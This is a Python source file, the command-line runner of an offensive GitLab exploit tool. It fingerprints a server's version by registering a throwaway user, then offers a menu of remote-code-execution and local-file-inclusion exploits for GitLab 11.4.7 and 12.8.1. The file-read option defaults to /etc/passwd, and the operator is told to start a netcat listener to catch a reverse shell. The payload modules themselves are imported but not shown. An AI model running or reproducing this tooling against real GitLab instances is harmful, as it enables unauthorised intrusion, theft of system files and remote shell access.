"""CLI orchestration: version detection, exploit menu, and dispatch."""

from __future__ import annotations

from .client import GitlabClient
from .version import detect_version
from .exploits.lfi_1281 import LFI1281
from .exploits.rce_1147 import RCE1147
from .exploits.rce_1281 import RCE1281


class Runner:
    """Presents the exploit menu and dispatches to the selected module."""

    def __init__(self, client: GitlabClient) -> None:
        self.client = client

    # ------------------------------------------------------------------ #
    # Version detection                                                  #
    # ------------------------------------------------------------------ #

    def _print_version(self) -> None:
        self.client.register_user()
        version = detect_version(self.client)
        if version:
            print(f"The Version seems to be {version}! Choose wisely")
        else:
            print("Could not get version!")
            self.client.abort()
        self.client.delete_user()

    # ------------------------------------------------------------------ #
    # Exploit dispatch                                                   #
    # ------------------------------------------------------------------ #

    def _run_rce_1147(self) -> None:
        RCE1147(self.client).run()

    def _run_lfi_1281(self) -> None:
        """Prompt for a target file path, then run the LFI exploit."""
        default = "/etc/passwd"
        raw = input(
            "please type in the fully qualified path of the file"
            f" you want to LFI. Uses {default} when left empty: "
        ).strip()
        LFI1281(self.client, raw if raw else default).run()

    def _run_rce_1281(self) -> None:
        RCE1281(self.client).run()

    # ------------------------------------------------------------------ #
    # Menu                                                               #
    # ------------------------------------------------------------------ #

    def _choose(self) -> int:
        options = [
            (RCE1147.description, self._run_rce_1147),
            (LFI1281.description, self._run_lfi_1281),
            (RCE1281.description, self._run_rce_1281),
        ]
        for i, (desc, _) in enumerate(options):
            print(f"[{i}] - {desc}")

        choice = None
        while choice not in range(len(options)):
            try:
                choice = int(
                    input("type a number and hit enter to choose exploit: ")
                )
            except ValueError:
                pass

        desc, exploit_fn = options[choice]
        input(
            f"Start a listener on port {self.client.port} and hit enter"
            f" (nc -vlnp {self.client.port})"
        )
        exploit_fn()

    # ------------------------------------------------------------------ #
    # Entry point                                                        #
    # ------------------------------------------------------------------ #

    def run(self) -> None:
        print("Gitlab Exploit by dotPY [insert fancy ascii art]")
        self._print_version()
        self._choose()
